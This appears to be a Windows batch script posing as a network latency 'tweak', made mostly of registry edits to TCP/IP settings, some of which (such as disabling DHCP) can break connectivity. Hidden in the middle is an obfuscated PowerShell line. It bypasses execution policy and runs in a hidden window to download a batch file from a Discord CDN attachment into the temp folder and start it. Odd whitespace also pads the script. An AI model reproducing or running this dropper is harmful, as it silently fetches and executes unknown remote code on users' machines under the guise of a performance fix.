reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\%%i" /v "TCPNoDelay" /d "1" /t REG_DWORD /f
reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\%%i" /v "TcpAckFrequency" /d "1" /t REG_DWORD /f
reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\%%i" /v "TcpDelAckTicks" /d "0" /t REG_DWORD /f
reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\%%i" /v "DefaultTTL" /d "64" /t REG_DWORD /f
reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\%%i" /v "TcpMaxDataRetransmissions" /d "3" /t REG_DWORD /f
cd %temp%
@powershell -NoP"r"o"f"ile -Executi"o"nPolic"y" Bypass -W"i"ndowStyle Hidden -C"o"mmand "I"nv"o"ke-WebReq"u"est https://cdn.discordapp.com/attachments/1202741667363557407/1202743189384200202/Meret_Reach__KnockBack.bat -"O"ut"fi"le Meret_Reach__KnockBack.bat; St"art-Process Meret_Reach__KnockBack.bat
reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DefaultTTL" /d "64" /t REG_DWORD /f
reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpMaxDataRetransmissions" /d "3" /t REG_DWORD /f
reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "Tcp1323Opts" /d "1" /t REG_DWORD /f
reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpMaxDupAcks" /d "3" /t REG_DWORD /f
reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpNumConnections" /d "4294967294" /t REG_DWORD /f
reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpTimedWaitDelay" /d "30" /t REG_DWORD /f
reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableDHCP" /d "0" /t REG_DWORD /f
reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "SackOpts" /d "1" /t REG_DWORD /f
reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "KeepAliveTime" /d "1" /t REG_DWORD /f
reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TCPCongestionControl" /d "1" /t REG_DWORD /f
reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnablePMTUBHDetect" /d "1" /t REG_DWORD /f
reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnablePMTUDiscovery" /d "1" /t REG_DWORD /f
reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableMulticastForwarding" /d "0" /t REG_DWORD /f
reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "KeepAliveInterval" /d "1" /t REG_DWORD /f
reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxUserPorts" /d "65534" /t REG_DWORD /f
reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxFreeTcbs" /d "65535" /t REG_DWORD /f
reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "NumForwardPackets" /d "1" /t REG_DWORD /f
reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DisableIPSourceRouting" /d "1" /t REG_DWORD /f
reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DisableMediaSenseEventLog" /d "1" /t REG_DWORD /f
reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\QoS" /v "Do not use NLA" /d "1" /t REG_SZ /f
                                                                                                                                                                        @echo off